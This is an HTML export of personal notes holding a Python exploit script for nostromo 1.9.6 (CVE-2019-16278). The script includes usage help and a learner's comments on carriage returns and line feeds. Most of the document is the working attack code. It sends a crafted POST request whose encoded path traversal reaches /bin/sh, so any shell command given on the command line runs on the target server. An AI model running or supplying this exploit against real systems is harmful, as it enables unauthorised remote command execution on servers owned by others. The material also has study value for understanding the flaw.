<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>exploit</h1><br/><p># Exploit Title: nostromo 1.9.6 - Remote Code Execution</p><p># Date: 2019-12-31</p><p># Exploit Author: Kr0ff</p><p># Vendor Homepage:</p><p># Software Link: <a href="http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz">http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</a></p><p># Version: 1.9.6</p><p># Tested on: Debian</p><p># CVE : CVE-2019-16278</p><p></p><p>#cve2019_16278.py</p><p></p><p>#!/usr/bin/env python</p><p></p><p>import sys</p><p>import socket</p><p></p><p>art = &quot;&quot;&quot;</p><p></p><p>                                        _____-2019-16278</p><p>        _____  _______    ______   _____\    \   </p><p>   _____\    \_\      |  |      | /    / |    |  </p><p>  /     /|     ||     /  /     /|/    /  /___/|  </p><p> /     / /____/||\    \  \    |/|    |__ |___|/  </p><p>|     | |____|/ \ \    \ |    | |       \        </p><p>|     |  _____   \|     \|    | |     __/ __     </p><p>|\     \|\    \   |\         /| |\    \  /  \    </p><p>| \_____\|    |   | \_______/ | | \____\/    |   </p><p>| |     /____/|    \ |     | /  | |    |____/|   </p><p> \|_____|    ||     \|_____|/    \|____|   | |   </p><p>        |____|/                        |___|/    </p><p></p><p></p><p></p><p>&quot;&quot;&quot;</p><p></p><p>help_menu = &#39;\r\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;&#39;</p><p></p><p>def connect(soc):</p><p>    response = &quot;&quot; #empty string for concatination</p><p>    try:</p><p>        while True:</p><p>            connection = soc.recv(1024) </p><p>            if len(connection) == 0:</p><p>                break</p><p>            response += connection # this is the above string for here to be concatenated with the connection , where connection is a response</p><p>    except:</p><p>        pass</p><p>    return response # this is where we receive the response from our command</p><p></p><p>def cve(target, port, cmd):</p><p>    soc = socket.socket() # creating a socket for connection </p><p>    soc.connect((target, int(port))) # connecting the target</p><p>    payload = &#39;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2&gt;&amp;1&#39;.format(cmd) # look how the post request is being sent , the \r\n </p><p>    </p><p>    # The end of the headers of an HTTP request is signaled by the sequence &quot;&quot; where &quot;\r&quot; is a &#39;carriage return&#39; character (0x0d) and &quot;\n&quot; is the &#39;line feed&#39; character (0x0a) .</p><p>#1)</p><p>#huh, what is the difference between is &quot;carriage return&quot; and a &quot;line feed&quot;? (maybe i don&#39;t understand it because i&#39;m not a native english speaker, so sorry for this)</p><p>#The terminology dates back to the time of &#39;teletypes&#39; when a &quot;carriage return&quot; character just send the carriage of the teletype back to the beginning of the line and the &quot;line feed&quot; character just moved the paper to the next line without move the carriage back to the start of the line.</p><p></p><p>#&gt;</p><p>#2)</p><p>#if you say that i can write it in one long string, then how the hell would you write this below:</p><p>#rq.write(&quot;GET /index.htm HTTP/1.1 &quot;);</p><p>#rq.write(&quot;Host: aaa.eu:80 \n\n&quot;);</p><p>#rq.write(&quot;GET /index.htm HTTP/1.1\r\nHost: aaa.eu:80\r\n\r\n&quot;);</p><p></p><p></p><p>    soc.send(payload)</p><p>    receive = connect(soc) # that above response is here in str form </p><p>    print(receive)</p><p></p><p>if __name__ == &quot;__main__&quot;:</p><p></p><p>    print(art)</p><p>    </p><p>    try:</p><p>        target = sys.argv[1]</p><p>        port = sys.argv[2]</p><p>        cmd = sys.argv[3]</p><p></p><p>        cve(target, port, cmd)</p><p>   </p><p>    except IndexError:</p><p>        print(help_menu)</p></div>
</body>
</html>
